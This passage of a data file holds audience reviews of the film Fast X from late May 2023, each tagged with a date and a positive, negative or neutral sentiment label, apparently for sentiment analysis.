I left the theatre mentally tired and not gonna watch the follow up movies. Also don't do the ""family"" drinking game. You'll be hospitalized if you do."
"May 29, 2023",POSITIVE,It’s was soo good I loved it so much
"May 29, 2023",POSITIVE,"action from the beginning! surprisingly cool movie about family, loved all the different cars!"
"May 29, 2023",POSITIVE,Here is alot of action.  You don't realize you have been watching a movie for 2.21 hours.
"May 29, 2023",POSITIVE,Okay so lemme start by saying I didnt know how t
"May 29, 2023",POSITIVE,Excellent flick. I just don't like the fast that Fast 11 probably won't be out until 2025. Otherwise I loved it. Will seeing again on the IMAX screen .
"May 29, 2023",NEGATIVE,"Did not like Jason Momoa in the movie. The role was just blahhhh, preferred the good o same actors which makes the movie really great. It just seemed over acted in his role"
"May 29, 2023",NEUTRAL,"Very slow to begin with but nice that it gave you synopsis of past movies to catch up or understand, but really that ending, geez - Be sure to stay past the credit to see additional story line"
"May 29, 2023",POSITIVE,Lots of action.. make another
"May 29, 2023",NEUTRAL,It’s a typical Hollywood action movie 🍿  🎥
"May 29, 2023",POSITIVE,Action through out the movie
"May 29, 2023",POSITIVE,Action pack movie. Lots of nice locations. And strong on family. Like that a lot. Keep bringing back other actor and actress back to the movie which is nice but not very realistic. Good action movie.
"May 28, 2023",POSITIVE,Fast X was off the chain! If you are skeptical .. DONT BE! They did it again!
"May 28, 2023",POSITIVE,Really great story line.
"May 28, 2023",POSITIVE,Fast X was tons of fun and more than plenty of action watch through the credits!!!
"May 28, 2023",NEGATIVE,It was as good as the previous movies like The Fate and the Furious. In my opinion Cypher is a more exciting villain than Dante. Mamoa character was quite annoying to me.
"May 28, 2023",POSITIVE,"Best Fast And Furious movie in years! Jason Mamoa stole the show, he was hilarious."
"May 28, 2023",POSITIVE,Oh my gosh that was an awesome movie it was a whole lot of action I Luve fast X
"May 28, 2023",NEGATIVE,Nothing new original or particularly engaging here.  Was also dissapointed with the ending - but not terrible for a Fast and Furious movie.
"May 28, 2023",POSITIVE,Disliked the cliffhanger ending!
"May 28, 2023",POSITIVE,My son said it was the best one ever
"May 28, 2023",POSITIVE,"Jason Momoa stole the movie, every scene he was in was wild. Thought the son could have had more intensity being he was in so many life and death situations. Charlize a thrill to watch as a bad guy. Was it TOO violent? Yeah. Unnecessary, the action is the total quality and thrilling car chases and that giant ""bomb"" rolling through Rome, fab. .  I totally enjoyed."
"May 28, 2023",POSITIVE,"I thought it was very good, action packed and a lot of moving parts plus a cliffhanger to boot!"
"May 28, 2023",NEGATIVE,"exaggerations are already common in this series, but if it wasn't enough to resurrect characters without the slightest explanation, they still darken Dom's son just to give representation out of context... a bad script is also nothing new...."
"May 28, 2023",NEGATIVE,I never got to see the movie. The power went out around 1245
"May 28, 2023",POSITIVE,"Went perfectly with the rest of the franchise.
Great comedy moments, good action scenes and a couple plot twist you don't see coming. HATE the cliffhanger but eagerly awaiting part 2."
"May 28, 2023",POSITIVE,"Great plot twists, comebacks and action packed"
"May 28, 2023",POSITIVE,Unlike the action began early in the movie.  It was good to see everyone appear again seeing as through we never really saw them die.  I did not care the way it ended leaving the suspense of the crew survived.  What happens to Dom and his son?  Another movie in the makings.
"May 28, 2023",POSITIVE,"if you enjoyed the other movies in this franchise, particularly the last few from 5 on, you will enjoy this one. the stunts, fights, explosions, and of course the cars do not disappoint. they somehow keep raising the bar and continue to deliver. the whole crew being back and the new additions all bring their A game. the series went over the top quite a few films ago, but if you know what you are going to get, you will love it. Jason Momoa as the new villain killed it!"
"May 28, 2023",NEUTRAL,Movie was ok a lot of unbelievable car stunts
"May 28, 2023",POSITIVE,"Had the action,heart and comedy that this series is known for."
"May 28, 2023",POSITIVE,I loved the movie. I hated the cliffhanger. Very excited to see the next one
"May 28, 2023",POSITIVE,Great but unbelievable action.  Dante was incredible.
"May 28, 2023",POSITIVE,It was good it had me on my seats with excitement
"May 28, 2023",POSITIVE,Great movie but hated the end! Left you hanging.
"May 28, 2023",POSITIVE,"Love the action, the enthusiasm, the protection, and the love for family. He does it up all the time. Great job."
"May 28, 2023",NEGATIVE,Disliked the fiction action around the whole movie
"May 28, 2023",POSITIVE,Great action movie snd older cars
"May 28, 2023",POSITIVE,Good story telling and lot’s of action
"May 28, 2023",POSITIVE,"Loved it! So much action packed, kept us on the edge of our seats through the whole movie!"
"May 28, 2023",NEGATIVE,"How are people loving this. It’s so bad, the whole movie just feels like one constant attempt to keep you on your feet and fails. The ending is a big cliffhanger which makes you pissed because there’s no resolution for a 2 and a half hour movie"
"May 28, 2023",POSITIVE,"Audacious - earnestly so - but I had a blast. I'd heard Momoa was great in this, and I agree. This was very much like a grown up version of the cartoons I watched as a kid (long, long ago...). A great bunch of characters who all have a chance to kick butt (and have their butts kicked). I've missed most of the movies in this franchise (I think I saw the first 2, and the Hobbs & Shaw spinoff) but now I'd like to go back and see them all. Despite not having that much familiarity with the ins and outs of this series, it was not hard at all to follow what was going on."
"May 28, 2023",NEGATIVE,Felt like this is a result of the writers strike.... And yeah I know it just happened that's how bad it is .
"May 28, 2023",POSITIVE,"Amazing - Jason Mimosa was amazing in his role and Having Gal Gabot return.... was just the best! 

The return of the Rock at the end - I'm ready for the next chapter."
"May 28, 2023",POSITIVE,Entertainment at its best!
"May 28, 2023",POSITIVE,Love it!!! It can't end that way!!! Expect a cliffhanger at the end!!! It will leave you for more!!!
"May 28, 2023",POSITIVE,"It was entertaining and good fun for the whole family.  The action scenes were over the top.  But, what can you expect from a franchise thats trying to top making 9 other movies?"
"May 28, 2023",POSITIVE,Not steeped in reality of course but the action was top notch.  The theme of family is still strong. There are plenty of surprises so pay attention.  A bit of rehashing but that is to be expected.  Stay tuned…
"May 28, 2023",NEUTRAL,"Fairly brainless popcorn action film. Lot of fun, but don't try to think too much... Jason Momoa is great, Alan Ritchson will be great future star of many action films, Brie Larson... as always. Really fun to watch, some kind of ""guilty pleasure""... but I think it's time to stop? Anyway, I had a good time and I'm not going to apologize for it!"
"May 28, 2023",POSITIVE,Great picture awesome stunts
"May 28, 2023",POSITIVE,Kept you engaged - great action and story!
"May 28, 2023",NEUTRAL,"If you're looking for god father or citizen cane, this is definitely not for you. Its just big, loud, dumb fun. just turn your brain off and shove pop corn in your mouth."
"May 28, 2023",POSITIVE,Spectacular. Unexpected. Excellent!
"May 28, 2023",NEGATIVE,"Poor plot, clichéd beyond anything I've ever seen, unnecessarily long, boring, disjointed, nonsensical...hated it."
"May 28, 2023",POSITIVE,Family. One last time.
"May 28, 2023",POSITIVE,"Such epic action, especially with the cars."
"May 28, 2023",NEUTRAL,It is what it is. Its a straight up Popcorn Summer Movie. What else would anybody expect?
"May 28, 2023",POSITIVE,There has to be a part 2 can’t just keep us hanging like that.
"May 28, 2023",POSITIVE,"It was great, nothing to complain about. Is Fast & Furious, don't look up for reality."
"May 28, 2023",NEGATIVE,"I was all in, even until the ninth movie with it's space dumbness. In that one, Justin Lin put really much effort in the action scenes, where most of them were practical masterpieces.

But Fast X is the badest and dumbest part in the whole franchise. The action is CD and nothing matters. Never you have a feeling of tension. The action is not a little bit fun to watch. It's just a stupid movie. But this time, not a fun stupid movie. Just stupid. The sunken cost effect forces me to emparrass myself and go to these movies. I am doomed."
"May 28, 2023",NEGATIVE,Actions scenes were good ..dialogue waskinda slow
"May 28, 2023",POSITIVE,High Tech action was great.  the ending sucked and obviously gave viewers of the next one coming up in 2 or 3 years Uuuuggghhhh!!!!!!!!!
"May 28, 2023",NEGATIVE,Horrible movie nothing else needs to be said
"May 28, 2023",POSITIVE,"This episode was fun, exciting, occasionally silly, but really entertaining!  Bought tix for a 2nd time right after the 1st, so much better than Fast 9 and this one had a lot of surprises!!!"
"May 28, 2023",NEUTRAL,I didnt like the ending at all. But very entertaining and action packed.
"May 28, 2023",POSITIVE,Loved this movie from beginning to end. Must see. Action packed!
"May 28, 2023",POSITIVE,"Loved the movie good as always 4DX is awesome 
Enjoyed how they recap the previous movie as well"
"May 28, 2023",POSITIVE,"I love every scene of the movie. Some part was funny and the rest was very tense with too many stunt. Overall, it was a good  and it seems like there will be a sequel continuation of the movie. The war is not over yet."
"May 28, 2023",NEUTRAL,I found it very boring at the beginning but it picked up. Jason Mamoa was awesome. He played his character very well and he almost had a prominent joker vibe to him. The other characters were good too. Another complaint is the plot. Very confusing and I found myself lost a good amount of times. But I would still go see it cause it's a Fast & Furious movie. Always thrilling to see.
"May 28, 2023",POSITIVE,Non stop action and the inserts of humor were well placed.  The cliff hangers though will leave you grinning.
"May 28, 2023",NEGATIVE,"Demasiada ficción, nada basado a la realidad como en las primeras entregas, escenas forzadas y sin elocuencia."
"May 28, 2023",POSITIVE,"This installment of the Fast franchise stays true to the spirit of the other films. Vin Diesel does not disappoint. The fight scenes between Michelle and Charlize are brutal... in a good way. Some scenes, like the guy in the punching bag and the toenail painting are just stupid. There are enough explosions and intense moments to give me more than I can for. I thoroughly enjoyed the ride."
"May 28, 2023",POSITIVE,"We are talking about the series where the bunch of people crash satelites with cars shoot to space and big dudes smash each other through the walls. Obvioiusly no one should expect a Shakespeare level of writing here or wit of Sherlock Holmes. But if you are after some proper action movie where things flash, explode, crash and explode again, then you will have a hard time to find someting better than F&F series, and Fast X carries the tradition of the series forward with all the usual shenaningans and turns it up to 11. Well worth watching, if you are after this kind of cinema :)"
"May 28, 2023",POSITIVE,Loved it.  Cant wait for the next one
"May 28, 2023",NEUTRAL,Ok but didn’t know was part 1
"May 28, 2023",POSITIVE,"Did you like the other fast and furious movies?! If you did you will love this! Omg! Jason as the villain was so creepy and good ( i loved his clothes that matched his cars) The cars, the bikes the action.. I saw this on IMAX.. Go see it! Oh and the teaser at the end lets us know there is more to come..."
"May 28, 2023",NEGATIVE,Were to much fiction and speculate scenes as much.
"May 28, 2023",NEGATIVE,Just like the others; so ridiculously out of touch with reality; even my 8 year old son rolled his eyes. Go back to your roots.
"May 28, 2023",POSITIVE,"Loved it. Action from beginning to end, with a few surprises."
"May 28, 2023",POSITIVE,This is one of the best action movies from Fast and Furious
"May 28, 2023",POSITIVE,I did not disappoint. Plenty of action.  Can not wait for XI
"May 28, 2023",NEGATIVE,Mostly boring with action hits. It's just set up for the last  F&F. Mamoa is fun but his energy isn't matched by the blandness of the rest of the cast.
"May 28, 2023",POSITIVE,Action pack !!! Jason Momoa and Jason Stratham what more can you ask
"May 28, 2023",POSITIVE,"I loved the movie, but I hate now I have to wait 3 years (maybe) just to see if everyone is dead, or survived. Just a lot of emotions 🥴😂"
"May 28, 2023",NEUTRAL,It's a solid version of the franchise with Jason Mamoa as an intriguing villain
"May 28, 2023",POSITIVE,Awesome. This movie was the best of the saga
"May 28, 2023",POSITIVE,"Great action, non-stop. What a thriller. If you like car racing & drag racing, this was the movie to see. Great acting."
"May 28, 2023",NEGATIVE,The plot and the end.
"May 28, 2023",NEGATIVE,Just a weak movie overall. Left halfway through
"May 28, 2023",POSITIVE,Action packed from the very beginning
"May 28, 2023",NEUTRAL,"This was so ridiculous but so much fun. Watching the trailer I wasn't so sure Momoa and the way his character is inserted into Five would work well, but it worked really well. I kind of wish this should've been what followed 7 but on the other hand, without the atrocities that are 8 and 9, this possibly couldn't have ended up as fun and ridiculous. Jason Momoa is here to give the franchise a character that looks like he's having all the fun in the world when every other character is either smouldering cooly or bickering to be funny. They also finally figured out how to use Charlize Theron after wasting her in two movies even in the limited screen time but kinda feels a bit too late but I figure there's more in store in the sequels. Vin Diesel is starting to look old and when Helen Mirren comes onscreen they have this peculiar tension going on like in the previous movies but this time, the age difference doesn't seem jarring anymore, lol. The way they have designed this movie is to make this the Franchise's Infinity War moment, of course not as good, but still, it does work to a point. It's still one of the weaker ones in the franchise, but not as bad as the entries after 7, but without those, I may not have enjoyed this either. I'm pumped to see what the Franchise has to offer going forward. I bet some more resurrections and at least a couple of final deaths are there in store."
"May 28, 2023",POSITIVE,"Love the action, plot and the surprise actors🔥 can’t wait for the next one"
"May 28, 2023",POSITIVE,"Best one yet.. so much action- loved Jason Momoa in this one. Love the originals , but added new characters keeps it more interesting. Cannot wait until the next one. But, 2025 is a long time to wait! 5 outta 5 popcorn bags! Brillant!"
"May 28, 2023",NEGATIVE,"That was alot of cringe. But I guess if you can suspend logic and the laws of physics for 2hours, you're good. Was hoping it's the last one, but alas."
"May 28, 2023",NEUTRAL,"it left my in suspense . what happened to Jason stratam after he left with all those guns , where did the Rock appear from . what happened ????? so much to ask . i dont like the ending"
"May 28, 2023",POSITIVE,The movie was ok.  I totally didn't like the to be continued ending
"May 28, 2023",POSITIVE,"Look forward to the sequel. Left us wondering how Letty is getting back, did Dom and his son make it out, and where did Jason S go to save his mum?"
"May 28, 2023",POSITIVE,Very good movie but some of the car driving is too much
"May 28, 2023",POSITIVE,"Fast X is a great movie it has a lot of great action (enough action that you expected from a fast in the furious movie) and way better than the 9th movie, can't wait for the part 2 sequel and renember don't listen to the critics but listen to the fans"
"May 28, 2023",POSITIVE,I have to go to another one
"May 28, 2023",POSITIVE,Very fast action time flew bye comfortable seat .over priced drinks 16 buck for 2 drinks
"May 28, 2023",NEUTRAL,Pro - Action packed.  Con - Completely ridiculous. Setting the stage to convert to a superhero franchise?
"May 28, 2023",POSITIVE,"The end, why don’t they end it"
"May 28, 2023",POSITIVE,"The whole movie is action packed.  Once it started, action packed, through and through."
"May 28, 2023",POSITIVE,Great action can't wait for Part 2
"May 28, 2023",NEUTRAL,good but predictable.
"May 28, 2023",POSITIVE,Great Action as Always!💜😎👏🏿
"May 28, 2023",NEGATIVE,Cheesy one-liners and way too unrealistic
"May 28, 2023",POSITIVE,Great Movie cant wait to Fast 11
"May 28, 2023",POSITIVE,Lots of fast action & Jason Momoa did an excellent job!! Kudos
"May 28, 2023",NEUTRAL,"If you like shooting and blowing up things, maybe you will enjoy this movie.  I did not enjoy the movie, it didn't make any sense to me. Just a waste of money."
"May 28, 2023",POSITIVE,Very Good Movie Lots of Action can't wait part 2 .
"May 28, 2023",POSITIVE,This movie is amazing!
"May 28, 2023",POSITIVE,The movie was outstanding from the beginning to the end.
"May 28, 2023",NEGATIVE,Too much family not enough cars
"May 28, 2023",NEGATIVE,People actually watch this?
"May 28, 2023",POSITIVE,"This one was filled with everything the first one had, it definitely didnt disappoint!!"
"May 28, 2023",POSITIVE,"I watched this movie today. My parents didnt like it but i thought it was AMAZING. Probably not the best Fast and Furious movie, but it was definitely a good one."
"May 28, 2023",POSITIVE,Action packed from start to finish
"May 28, 2023",NEUTRAL,"I liked this movie, I thought the main villain was really good. I don't like that they brought back the character played by Gal Galot because she died. The movie also ends really abruptly which caught me off guard and I don't like that they are going to make 2 more of these movies. Other than that I liked it."
"May 28, 2023",POSITIVE,Loved how much action it was and ready for 5he next part
"May 28, 2023",POSITIVE,Really good movie! I want to see the rest!
"May 28, 2023",POSITIVE,Everything was good until the ending. Had me confused. They keep milking these movies
"May 28, 2023",POSITIVE,"Action packed, sad, confusing and can't wait for more!!!"
"May 28, 2023",POSITIVE,"Always full of action from the very beginning. It was great to see all the characters come together in this movie. Hopefully, the next movie will continue with the story line and with the returning/new characters."
"May 28, 2023",POSITIVE,Action packed and entertaining from beginning to end! This was probably my favorite in the series.
"May 28, 2023",NEGATIVE,The character interactions were solid. We all expect to suspend disbelief in exchange for great action shots and easy laughs. Momoa ruins that whole equation. He is gratting and irritating. I actually left the theater annoyed at his character. This is easily the worst fast and furious as there is no campy plot without a good villain. Momoa not only spoiled a summer action flick but ruined my evening leaving me to rant online. This movie is bad enough to make me rethink my opinion of an actor I initially liked a lot in previous rolls.
"May 28, 2023",POSITIVE,"Good action, special effects, and character likeability."
"May 28, 2023",POSITIVE,"Loved it all, surprised on no ending"
"May 28, 2023",POSITIVE,It was good. Liked bringing in all the characters.  Jason Momoa should have been a little bit more serious not a clown for the evil side of the story.
"May 28, 2023",POSITIVE,Better storyline with action packed scenes.
"May 28, 2023",POSITIVE,Best Fast and Furious sequel yet! Jason Mamoa’s character as the “bad guy” was a hit!
"May 28, 2023",NEGATIVE,Atuações sofríveis e desenvolvimento do filme extremamente previsível
"May 28, 2023",NEUTRAL,Nothing makes me more excited like unexpected sh*t and this movie is full of it. But it also has a lot of the same sh*t
"May 28, 2023",POSITIVE,So good never disappoints
"May 28, 2023",POSITIVE,"Another aviation’s packed Fast and Furious film! Lots of car chases, explosions and gun fire. Momoa did a great job playing somewhat of a mean/goofy character. And your can’t go wrong with this trifecta…Vin Diesel, Momoa and Cena!"
"May 28, 2023",POSITIVE,Great action scenes!!
"May 28, 2023",POSITIVE,Loved the whole movie!
"May 28, 2023",POSITIVE,I love all the stars in the movie. Storyline got me a couple of times.
"May 28, 2023",POSITIVE,"Seeing Paul walker was the best, and how he went after his son and by the ending Ik it will be another one"
"May 28, 2023",POSITIVE,Full of action from start to finish!
"May 28, 2023",POSITIVE,I do not want to say too much about Jason Momoa's character but there was a quality that does not quite fit his size.  He was joker versus comic
"May 28, 2023",POSITIVE,Great movie. Cant wait for the final chapter.
"May 28, 2023",NEGATIVE,Thanks for wasting two hours for nothing.
"May 28, 2023",POSITIVE,"It had a good story, even though Jason Momoa had a Johnny Depp syndrome. I'll be looking forward to the next chapter."
"May 28, 2023",NEGATIVE,"Grew up with Vin and his familia, and seen all his movies, my wife forces me, but this one, que paquete!! The helicopter scene, rear wheels where off the ground and yet, he wins.  Then the kid jumps cars, unbelievable, but the biggest wopper is the dam scene, ridding down the wall...unbelieavable...almost crap.  These movies were exciting cause they were almost believable, not anymore.  Also, Mamoa didnt do a good job, he seemed to have copied the joker that keith ledger did, not original at all. Even with all of this, it was still nice to see the team and the father son scenes, also dont like Scena, but loved the 90s music."
"May 28, 2023",POSITIVE,"Movie is entertaining, heart stopping an keeps you on the edge of your seat. It's a must see"
"May 28, 2023",POSITIVE,"W🤯W! Needed to watch FAST X wearing seat belts! Storyline rocks from LA to  London, Brazil, Portugal with a HUGE cast. Saw it in ScreenX across 3 screens. Loved it!"
"May 28, 2023",POSITIVE,"It is all that I expected. It's fun, exciting, sad and keeps you on your toes for more"
"May 28, 2023",NEGATIVE,"Jason Mamoa's character was horribly played and way over the top, as were the car explosions and general 'action sequences'."
"May 28, 2023",POSITIVE,Omg what’s not to like it was freakin awesome I can’t believe the rock is gonna be in the next part
"May 28, 2023",NEGATIVE,Worst  movie  come from franchise
"May 28, 2023",POSITIVE,"Great plot to get a return for the next move, great ending cliffhanger"
"May 28, 2023",POSITIVE,Loved the movie. What a cliffhanger at the end.
"May 28, 2023",NEUTRAL,Didn’t love Jason Momoa as the villain. But the action was good.
"May 28, 2023",POSITIVE,It was great the action was awesome but the story and cgi could have been better.
"May 28, 2023",POSITIVE,Liked that is was serious but had funny parts as well
"May 28, 2023",POSITIVE,One of the best in the series!
"May 28, 2023",POSITIVE,action   action     action
"May 28, 2023",POSITIVE,I loved it!!! Can’t wait for second part!
"May 28, 2023",POSITIVE,Fast X was dope damn I can't wait til the next one comes in 2024-2025 I love Jason Mamoa as  Dante he's hilarious 🤣😆 wow I recommend u watch this movie 2x or more my gson loved it..
"May 28, 2023",NEGATIVE,"The exposition made no sense for most of the movie, was pretty nonsensical does anybody actually die in this franchise doesn't seem like it, this is definitely the worst in the series, I was a fan but the Family cringe was mentioned more than any actual racing, movie should of been called FAMILY,"
"May 28, 2023",POSITIVE,Awesome movie! Lots of action bombing and very touching moments.
"May 28, 2023",POSITIVE,The movie was full of action and overall a great watch.
"May 28, 2023",POSITIVE,Lot's of action! No boring plots! It was AWESOME!!!!
"May 28, 2023",POSITIVE,the movie was good just felt kinda like the acting was kinda bad action seens was good jason momoa definitely was good though felt he carried the movie through it all
"May 28, 2023",POSITIVE,Excellent! Action packed!
"May 28, 2023",POSITIVE,It's a Fast and Furious movie. It delivers on all accounts. Jason Momoa is so good in it too!
"May 28, 2023",NEUTRAL,Jason Momoa as the villain doesnt work
"May 28, 2023",POSITIVE,The stunts were incredible! The all star cast and diversity made the movie appealing to me.
"May 28, 2023",NEGATIVE,"I buckled up for the latest instalment in the adrenaline-fueled franchise, Fast X. Having previously enjoyed the well-made escapist nonsense of this franchise, I eagerly anticipated this action-packed joyride. But the reality falls short of the high-octane thrills and heart-racing moments we've enjoyed during this long-running, beloved series. Directed by a new visionary, Fast X struggles to find its footing, leaving me with a disjointed and lacklustre experience.

Though intended to be the cornerstone of the film, the plot feels convoluted and overstuffed. The narrative attempts to tie up loose ends from previous entries, resulting in a tangled web of unresolved storylines and contrived twists. The themes of loyalty, family, and redemption, which once resonated deeply, are now lost amidst the chaos of overblown action sequences and cheesy dialogue.

Unfortunately, the once-charismatic characters we've grown to love seem to be mere shadows of their former selves. The lacklustre performances by the ensemble cast dampen the film's impact, leaving me yearning for the chemistry and charisma that once made this franchise shine. The newcomers fail to make a lasting impression, and their interactions feel forced, lacking the organic camaraderie we expect from a Fast and Furious film.

While attempting to inject fresh energy into the series, the direction falters in execution. The pacing is erratic, with frenetic action scenes abruptly juxtaposed with moments of forced sentimentality. The director's attempts to reinvent the franchise fall flat, resulting in a disjointed and unsatisfying experience.

The score, cinematography, and production design, once standout elements of the Fast and Furious films, fail to leave a lasting impact. The familiar pulsating beats and slick visuals that defined the series are noticeably absent, replaced by generic choices that fail to elevate the overall experience. The special effects, too, lack the finesse and attention to detail we've come to expect, leaving action scenes feeling artificial and detached.

The editing further exacerbates the film's issues with jarring cuts and questionable transitions. Scenes that should have heightened the tension instead fall flat, as the editing fails to maintain a cohesive flow. The dialogue, filled with clichés and uninspired one-liners, adds little depth to the already weak characterisations, leaving me longing for the witty banter and memorable lines that once made these films a guilty pleasure.

While Fast X attempts to recapture the essence of what made this franchise a global phenomenon, it falls short in almost every aspect. As a viewer, I felt a palpable sense of disappointment, longing for the days when these films delivered heart-pounding action and captivating storytelling. It pains me to say that Fast X fails to leave a lasting impact, leaving me questioning the franchise's future.

Fast X is a lacklustre entry in the series, struggling to find its place amidst a convoluted plot, underwhelming performances, and a misguided attempt at reinvention. Despite its best intentions, the film fails to deliver the thrills and emotional resonance that made its predecessors successful. Fast X is a forgettable and disjointed experience that falls far behind the high standards set by the franchise—strap in for a disappointing ride."
"May 28, 2023",POSITIVE,Only because the way the ended it off!! But it was a good movie!!
"May 28, 2023",POSITIVE,lots of action vin dissel was great
"May 28, 2023",NEUTRAL,"Exactly what you would expect.  If you want brainless action, 10/10.  The story line is weak, the dialogue is weak.  Definitely passes the time."
"May 28, 2023",POSITIVE,The ending just left me hanging. 🫣👀👀👀
"May 28, 2023",POSITIVE,Just Great Dumb Fun. Mamoa was an excellent Camp villian. In the Universe rules of Dom Torretto only being invulnerable when in contact with a car applied here
"May 28, 2023",POSITIVE,This movie is amazing
"May 28, 2023",NEGATIVE,Ugh. Another terrible time with terrible actors.
"May 28, 2023",NEUTRAL,"senseless fight scenes. senseless deaths. unanswered plot lines.
not the best. thought this was the last movie. now need to have one more to tie up some loose ends."
"May 28, 2023",POSITIVE,"Honestly, it was a solid FF movie, took it back to the roots in some ways, and tried some new formula as well. That being said, Jason Mamoa had Entirely too much fun in that part and it was Absolutely fabulous. hahaha"
"May 28, 2023",NEGATIVE,"Fast X's most interesting component is its name. The series simply doesn't have the hook that series such as Marvel, DC, or even Transformers have to continue to keep people wanting to come back and is only able to keep a small amount of fans to keep spending money to see a bland and underwhelming film about people using the steering wheel I'm different ways."
"May 28, 2023",NEUTRAL,Too much action not enough racing
"May 28, 2023",POSITIVE,Outrageous fun and ridiculous in all the best ways!
"May 28, 2023",POSITIVE,There was plenty of action and the special effects were off the chain

"May 27, 2023",POSITIVE,Great movie. Can’t wait to see what they do next
"May 27, 2023",NEUTRAL,"Meh. After so many of the Fast and Furious movies I think I’ve become immune to the action.  Yah, the chase scenes are great but I used to be on the edge of my seat, watching them.  I’d wait for it to come out on streaming."
"May 27, 2023",NEGATIVE,Fast Furious movies in the past were better.
"May 27, 2023",POSITIVE,I really love this movie

"May 27, 2023",POSITIVE,Entertaining movie. Definitely better than the previous one and a unique installment.
"May 27, 2023",NEGATIVE,"Projector stopped working, movie was cancelled."
"May 27, 2023",POSITIVE,I loved it. only weird thing i noticed. After the fight seen on the bridge... car pieces everywhere..... how did the black camaro remain undamaged or dust free 🤔
"May 27, 2023",POSITIVE,"Pretty good, can’t wait to see the next one"
"May 27, 2023",NEGATIVE,"I am a huge fan of cars and this series. Highly disappointed. Movie was slow and the wrestlers on the show made it corny. I didn't understand the random scenes for the laugh, it was definitely odd because it's usually a clever sense of humor insert-this time was like watching the Hang Over. Still appreciate the cars and definitely need to bring back the Rock. This was worst than Tokyo Drift. Would recommend this to someone trying to kill time."
"May 27, 2023",POSITIVE,"Very action packed , great story and keeps you on the edge of your seat!! But the ending was terrible!!"
"May 27, 2023",NEUTRAL,Me apareció bueno 🫱🏾
"May 27, 2023",NEGATIVE,"Read some other reviews after my initial take. Good action, but the villain, Mommas character made the absurd just plain stupid. No reason for a goofball villain in a Fast movie. Yuck!"
"May 27, 2023",POSITIVE,It was amazing  I love it I waited for a year and a half to see this movie
"May 27, 2023",NEGATIVE,Same movie as the last 5
"May 27, 2023",NEGATIVE,"It’s a fast and furious movie, it’s just as over the top and ridiculous as you’d expect at this point. But surprisingly Jason Mamoa played a good “bad guy” in the movie and made it more enjoyable."
"May 27, 2023",NEGATIVE,The first half is amazing! Extremely entertaining. Once it's gets to a point where it ridiculously disobeys the laws of physics it starts to get unbearable and dumb. These are people are the end of the day.. not superheroes.
"May 27, 2023",POSITIVE,Action packed from beginning to the end. Can’t wait for the next one.
"May 27, 2023",NEGATIVE,"For me the franchise peaked with Fast 5 but I still enjoyed the 6th & 7th movies.  It's been all downhill from there.  The script for Fast X was very poorly written, the only jokes that landed were by Dante's character.  Jason Momoa was outstanding and gave his all to this movie. Tyrese Gibson on the other hand had some of the worst lines I have ever heard in a movie.  They were so bad that it made me feel uncomfortable and sorry for him. The moment Cipher showed up in the movie and acted like their ally the movie lost me.  She was one of the best (if not the best) villain during the entire franchise. The way they wrote Fast X I have this horrible feeling that she will be at the BBQ at Dom's house at the end of the final movie eating burgers and being part of the gang."
"May 27, 2023",NEGATIVE,Worst of the series and a complete waste of money.
"May 27, 2023",POSITIVE,Mamoa stole the movie!! I loved it!!
"May 27, 2023",POSITIVE,"A fun movie experience! Dont take it too seriously and its a great time. Mindless action, unbelievable action sequences and more of the same—but more grounded in reality than Fast 9. In a good way."
"May 27, 2023",NEUTRAL,"Didn't like or dislike it.  But if you wanna watch Jsson Momoa try to be The Joker and the usual impossible physics,  then this movie is absolutely for you. Alex"
"May 27, 2023",POSITIVE,Totally Awesome!!!!!
"May 27, 2023",POSITIVE,Fast paced couldnt leave my seat. Only thing I didnt like is have to wait for fast eleven to see what Ihappened
"May 27, 2023",POSITIVE,"This is different from all the other parts of this franchise. This is a must watch and Jason Momoa is beyond expectations, you can compare him with some real villains ever in bollywood. This is a Must Watch. With surprising ending."
"May 27, 2023",NEUTRAL,"When Jason Momoa's Dante isn't on screen, the movie works, but once Momoa's excessively over-the-top villain takes the center stage, does the movie it's time to hit the brakes. Everything else feels like a ""F&F"" movie when he's not around, but when he and some of the unnecessary humor, Brie Larson's wooden acting and outrageous stunts come in, the movie risks driving into a wall of stupidity at full force."
"May 27, 2023",POSITIVE,"loved , amazing , sad and funny.
AMAZING"
"May 27, 2023",POSITIVE,"Not as much action as the others, but still very entertaining!"
"May 27, 2023",POSITIVE,I always think these movies are entertaining! Would recommend watching. The ending definitely shows there is going to be another movie made!
"May 27, 2023",POSITIVE,its was the best one ever
"May 27, 2023",POSITIVE,"LOL!!! it was so Fast & so Furious! Jason Momoa is by far the best villain they have had so far.  He is SO embracing being  Dante, crazy and flamboyant. Definitely a cliffhanger, so stap in for the ride and anxiously await Fast 11!"
"May 27, 2023",POSITIVE,This movie was full of action I love seeing cars racing and jumping off through cliffs
"May 27, 2023",POSITIVE,I like the driving and explosive
"May 27, 2023",NEUTRAL,"After how bad the previous installment was, I must say that this new sequel revived what the fast and furious franchise is, the action is the best, like its imposing villain, on the other hand, it has the same problems of the other movies and that is the incoherence of its plot, besides that it makes no sense, and although it is not the best in the saga, it is one that you enjoy a lot."
"May 27, 2023",POSITIVE,Great story awesome action
"May 27, 2023",NEGATIVE,Omg this movie was dumb! It made no sense and defied physics!
"May 27, 2023",POSITIVE,"I don't know why people hate on these movies so much. They don't pretend to be anything that they aren't. What they are is good fun. I love the explosions and the muscles and the fun chases. I love the friendships and callbacks. I even love the outlandishness. The cast is ever-expanding and I love all the new characters. Shout out to Thad Castle, missed having a scream."
"May 27, 2023",NEUTRAL,It's a 100 million dollar telenovela with a plethora of well produced action scenes.
"May 27, 2023",NEUTRAL,"Unrealistic but entertaining. Aquaman is the best part of it, but Vin Diesel sucks at acting and needs to stick with what made the movie series great: racing and action 
Overall"
"May 27, 2023",POSITIVE,"Everything!! The script, the action and the story line!! Wonderfully thought out!!!"
"May 27, 2023",NEGATIVE,Horrible! What a waste of time and money.
"May 27, 2023",POSITIVE,Disliked the movies do not like cliffhangers especially when now we the movie goers have to wait so long while for  a so called 11th chapter of a saga continuos never ending.
"May 27, 2023",POSITIVE,"Movie was great I have watched almost every movie he has made,"
"May 27, 2023",POSITIVE,"Suspense, keep you guessing. Love it & can't wait for the next one."
"May 27, 2023",POSITIVE,"It had a lot of action, a lot of the dialogue, some comedy than just a good storyline I really enjoyed it. I plan to go back and see it again."
"May 27, 2023",POSITIVE,"The movie is great. Once you start ignoring the logic’s and the physics you’ll be able to have fun although I was aware that this is going to be part one of the ending, I will still left, mesmerized by the ending. It is nice to see that a lot of the iconic characters are still alive and some are returning. It is not one of my favorites but it’s definitely the top five."
"May 27, 2023",POSITIVE,Have watched from the very first one. Hate when gotta wait for the next one. Going to hate that we are at the end of the saga.
